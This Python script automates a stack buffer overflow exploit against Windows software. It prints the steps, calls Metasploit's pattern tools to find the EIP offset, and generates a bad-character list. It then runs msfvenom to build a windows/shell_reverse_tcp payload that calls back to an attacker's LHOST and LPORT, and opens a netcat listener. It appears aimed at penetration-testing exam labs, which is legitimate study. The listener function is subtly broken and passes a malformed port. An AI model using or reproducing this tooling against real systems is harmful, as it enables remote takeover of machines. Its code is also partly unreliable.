import subprocess
import sys
import textwrap


def bof_steps():
    print(textwrap.dedent(
        '''
        ####################################
        # Steps to Conduct Buffer Overflow #
        ####################################
        1. Fuzzing
           [a] Send bytes of data in increments of 100 bytes
           [b] Wait for crash and note the byte count
        2. Find the Offset
           [a] Send unique bytes the same length noted in step 1.b
           [b] Copy unique bytes in EIP
           [c] Find offset by passing in the length (noted 1.b) and unique bytes found in 2.b
        3. Overwrite the EIP
           [a] Once we have the offset send ‘A’s the same size as offset, then four ‘B’s to make sure
               we have control of eip example: shell_code = 'A' * 2003 + 'B' * 4
           [b] The eip should be overwritten with ‘42424242’ (if not redo step 2)
        4. Find bad characters
           [a] Send all possible 255 characters in hex and look for abnormal characters
               (updated code may look something like this: buffer = 'A' * 2606 + 'B' * 4 + badchars)
        5. Find the right module
        6. Generate shell code
        7. You already know\n
        '''))


def finding_offset():
    pattern_create = "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb"
    pattern_offset = "/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb"
    switch_byte_length = "-l"
    switch_unique_bytes = "-q"

    byte_count = input("[+] Paste byte count:")
    byte_count = str(byte_count)

    print("\n")
    subprocess.call([pattern_create, switch_byte_length, byte_count])
    print("\n")

    unique_bytes = input("[+] Paste unique bytes found in EIP:")
    unique_bytes = str(unique_bytes)

    print("\n")
    subprocess.call([pattern_offset, switch_byte_length, byte_count, switch_unique_bytes, unique_bytes])


def bad_characters():
    counter = 0
    print("\n[+] Bad Characters 1-255\n")
    print("badchars=(")
    for chars in range(1, 256):
        if counter == 0:
            print('"', end="")
        elif counter % 16 == 0:
            print('"', end="")
        sys.stdout.write("\\x" + '{:02x}'.format(chars))
        if chars % 16 == 0:
            print('"')
        counter = counter + 1

    print('"', end="" + ")" + "\n\n")


def generate_payload():
    ip = input("[*] Enter LHOST (ip of your machine):")
    lport = input("[*] Enter LPORT (port you want reverse to call back to):")
    badchars = input("[*] Enter badcharacters found in step 4:")

    msfvenom = "msfvenom"
    switch_payload = "-p"
    payload = "windows/shell_reverse_tcp"
    lhost = f"LHOST={ip}"
    lport = f"LPORT={lport}"
    no_crash = "EXITFUNC=thread"
    switch_format = "-f"
    format = "c"
    switch_architecture = "-a"
    architecture = "x86"
    switch_badchars = "-b"

    subprocess.call(
        [msfvenom, switch_payload, payload, lhost, lport, no_crash, switch_format, format, switch_architecture,
         architecture, switch_badchars, badchars])

    nc_listener(lport)


def nc_listener(lport):
    print(f"Necat listener listening on local port {lport}")
    subprocess.run(f"nc -nlvp {lport}")


def main():
    bof_steps()

    finding_offset()

    bad_characters()

    generate_payload()


if __name__ == '__main__':
    main()
